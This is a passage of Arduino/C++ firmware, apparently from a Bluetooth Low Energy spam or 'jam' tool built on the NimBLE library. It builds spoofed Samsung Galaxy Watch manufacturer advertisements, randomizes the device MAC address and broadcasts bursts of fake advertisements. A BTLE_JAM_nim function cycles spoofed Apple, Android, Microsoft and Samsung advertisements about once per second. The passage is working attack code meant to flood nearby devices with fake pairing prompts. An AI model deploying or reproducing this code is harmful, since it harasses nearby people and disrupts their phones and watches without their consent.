  {0x1C, ""},// "Gold Watch6 Gold 40mm"},
  {0x1D, ""},// "Silver Watch6 Cyan 44mm"},
  {0x1E, ""},// "Black Watch6 Classic 43m"},
  {0x20, ""},// "Green Watch6 Classic 43m"},
};

NimBLEAdvertisementData getSamsungAdvertisementData() {
  NimBLEAdvertisementData oAdvertisementData = NimBLEAdvertisementData();
        uint8_t model = watch_models[random(26)].value;
        uint8_t Samsung_Data[15] = { 0x0E, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, (model >> 0x00) & 0xFF };
        oAdvertisementData.addData(std::string((char *)Samsung_Data, 15));


  return oAdvertisementData;
}

void advertiseSamsung() {
  ble_types();
  mac_rann();
  for (int i = 0; i < 3; i++) {
    NimBLEAdvertisementData advData = getSamsungAdvertisementData();
NimBLEAdvertisementData oScanResponseData = NimBLEAdvertisementData();//////
    adv->setAdvertisementData(advData);
    adv->setScanResponseData(oScanResponseData);////////////////////

    adv->setMinInterval(0x20);
    adv->setMaxInterval(0x20);
    adv->setMinPreferred(0x20);
    adv->setMaxPreferred(0x20);

    adv->start();
    //   led.flash();
    delay(60);
    adv->stop();
  }
}


void BTLE_JAM_nim() {
  if ((last_update < millis())) {
    advertiseApple();
    advertiseAndroid();
    advertiseMicrosoft();
    advertiseSamsung();
  }
   
  if (last_update < millis())
    last_update = millis() + 1000;
}





#endif
